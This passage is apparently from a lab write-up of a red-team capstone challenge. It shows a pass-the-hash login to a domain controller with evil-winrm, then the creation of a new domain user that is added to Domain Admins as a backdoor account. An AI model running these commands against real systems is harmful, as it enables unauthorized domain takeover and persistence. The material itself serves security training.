
$ `proxychains4 /usr/bin/evil-winrm -u Administrator -H d3d4edcc015856e386074795aea86b3e -i 10.200.113.102`

![Dumping secrets from CORPDC-20240602155726615.webp](app://aada9d56eb98c8801394b98c13978398694d/media/sf_obsidian/Red%20Team%20Capstone%20Challenge/Images/Dumping%20secrets%20from%20CORPDC-20240602155726615.webp?1717358246568)

You'll get a shell.  
Check out the hostname.

Evil-WinRM PS C:\Users\Administrator\Documents> `hostname`

![Dumping secrets from CORPDC-20240602160026969.webp](app://aada9d56eb98c8801394b98c13978398694d/media/sf_obsidian/Red%20Team%20Capstone%20Challenge/Images/Dumping%20secrets%20from%20CORPDC-20240602160026969.webp?1717358426958)

### Create a new user as an Administrator

Evil-WinRM* PS C:\Users\Administrator\Documents> `net user kairos K41r@s123 /add /domain`

Username: kairos  
Password: K41r@s123

### Enumerate the groups to find the group name for the Administrator user

Evil-WinRM* PS C:\Users\Administrator\Documents> `net group`

![Dumping secrets from CORPDC-20240604135830320.webp](app://aada9d56eb98c8801394b98c13978398694d/media/sf_obsidian/Red%20Team%20Capstone%20Challenge/Images/Dumping%20secrets%20from%20CORPDC-20240604135830320.webp?1717523911003)

### Add the new user to this group to make him the `Domain Admin`.

Evil-WinRM* PS C:\Users\Administrator\Documents> `net group "Domain Admins" kairos /add /domain`

### Display user's information

The `net user` command is a Windows command-line utility that can be used to display or modify user account information. The `/domain` switch is used with `net user` to specify that the operation should be performed on a domain controller, allowing you to view or change user account information in a domain environment.

Evil-WinRM* PS C:\Users\Administrator\Documents> `net user kairos /domain`

![Dumping secrets from CORPDC-20240604140856658.webp](app://aada9d56eb98c8801394b98c13978398694d/media/sf_obsidian/Red%20Team%20Capstone%20Challenge/Images/Dumping%20secrets%20from%20CORPDC-20240604140856658.webp?1717524537015)

**Next step:** [[RDP to CORPDC]]
